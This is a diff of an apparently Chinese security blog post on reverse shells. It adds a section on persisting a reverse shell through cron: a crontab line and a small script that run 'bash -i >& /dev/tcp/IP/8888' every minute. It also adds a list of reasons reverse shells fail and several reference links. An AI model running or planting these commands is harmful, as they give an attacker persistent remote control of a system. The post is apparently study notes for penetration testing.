@@ -384,14 +384,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-07-26
+                    2021-12-07
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.2k
+                    1.4k
                 </div>
                 
 
@@ -444,6 +444,25 @@
 
 <p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307323674-b71ca629-7869-4534-ab4e-3feb9986cfd7.png" alt="img"></p>
 <p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623307242554-99df599d-d6cf-4913-8fde-69cd68b76c2d.png" alt="img"></p>
+<h3 id="定时计划反弹shell"><a href="#定时计划反弹shell" class="headerlink" title="定时计划反弹shell"></a>定时计划反弹shell</h3><ol>
+<li><code>crontab -e</code>直接写入</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * *  bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://s2.loli.net/2021/12/07/UqMAvptbo85mygr.png" alt="image-20211207163655912"></p>
+<ol start="2">
+<li>创建shell文件，然后通过<code>crontab -e</code>写入</li>
+</ol>
+<p>ps</p>
+<blockquote>
+<p>在<code>/etc/crontabshell</code>下写入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/IP/8888  0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>然后<code>crontab -e</code>写入</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * /etc/crontabshell</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/06f7cda74b84">Linux定时计划反弹shell</a></p>
+</blockquote>
 <h3 id="php-反弹"><a href="#php-反弹" class="headerlink" title="php 反弹"></a>php 反弹</h3><p>注意php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数  </p>
 <p>默认的php.ini文件中没有打开安全模式</p>
 <p>使用php的exec函数执行反弹shell的命令</p>
@@ -465,8 +484,16 @@
 <p><img src="https://cdn.nlark.com/yuque/0/2021/png/21562337/1623318265542-562f9432-6581-422d-89ef-d854d7a3feb0.png" alt="img"></p>
 <p>emmm暂时先鸽了</p>
 <h2 id="其他反弹shell的方式"><a href="#其他反弹shell的方式" class="headerlink" title="其他反弹shell的方式"></a>其他反弹shell的方式</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkxNDEwMDA4Mw==&mid=2247483867&idx=1&sn=ac1c105241c071190fae3d18938e9189&chksm=c172dbc7f60552d1e0e0dd5a23d71e00e6472ba344088c6811a7c426a2cf08cfc2af0ba06a80&scene=178&cur_album_id=1555994601520431105#rd">利用ICMP(icmpsh)协议反弹Shell</a></p>
+<h2 id="简单总结一下反弹shell失败可能得原因"><a href="#简单总结一下反弹shell失败可能得原因" class="headerlink" title="简单总结一下反弹shell失败可能得原因"></a>简单总结一下反弹shell失败可能得原因</h2><ul>
+<li>禁止出站ip（只允许访问特定ip）</li>
+<li>禁止出站端口（只允许访问特定端口）</li>
+<li>禁止出站协议(只允许特定协议，如icmp、dns、http)</li>
+<li>反弹命令不存在或是当前用户无权调用bash</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/105906432">反弹shell失败的几种原因</a></p>
 <h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/178150.html">linux下几种反弹shell方法的总结与理解</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/99793">powershell反弹shell常见方式</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/06f7cda74b84">Linux定时计划反弹shell</a></p>
 
                 
             </div>
@@ -865,7 +892,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">37.7k</span>&nbsp;字
+                class="white-color">38.2k</span>&nbsp;字
             
             
             
